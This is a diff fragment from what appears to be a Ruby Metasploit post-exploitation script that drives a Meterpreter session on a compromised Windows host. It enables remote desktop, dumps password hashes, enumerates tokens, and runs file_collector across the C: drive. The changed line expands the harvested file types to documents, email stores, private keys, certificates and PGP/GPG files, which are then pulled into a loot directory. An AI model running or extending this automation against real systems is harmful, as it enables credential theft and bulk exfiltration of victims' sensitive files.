@@ -16,5 +16,5 @@
                                 session.run_cmd('run getgui -e')
 				session.run_cmd('run post/windows/gather/smart_hashdump')
 				session.run_cmd('run post/windows/gather/enum_tokens')
-				session.run_cmd("run file_collector -d 'C:\' -f 'hosts|*.pdf|*.cfg|*.zip|*.tgz|*.gzip|*.tar|*.conf|*.ini|*.xls|*.xlsx|*.doc|*.docx|*.txt' -o /tmp/#{file}.fc")
+				session.run_cmd("run file_collector -d 'C:\' -f'hosts|*.pdf|*.cfg|*.zip|*.tgz|*.gzip|*.tar|*.conf|*.ini|*.xls|*.xlsx|*.doc|*.docx|*.txt|*.csv|*.eml|*.vsd|*.sxw|*.odt|*.rtf|*.mdb|*.wab|*.rst|*.xps|*.iau|*.cif|*.key|*.crt|*.cer|*.hse|*.pgp|*.gpg|*.xia|*.xiu|*.xis|*.xio|*.xig|*.acidcsa|*.acidsca|*.aciddsk|*.acidpvr|*.acidppr|*.acidssa' -o /tmp/#{file}.fc")
 				session.run_cmd("run file_collector -i /tmp/#{file}.fc -l #!TS_LOOT_DIR!##{lootdir}")
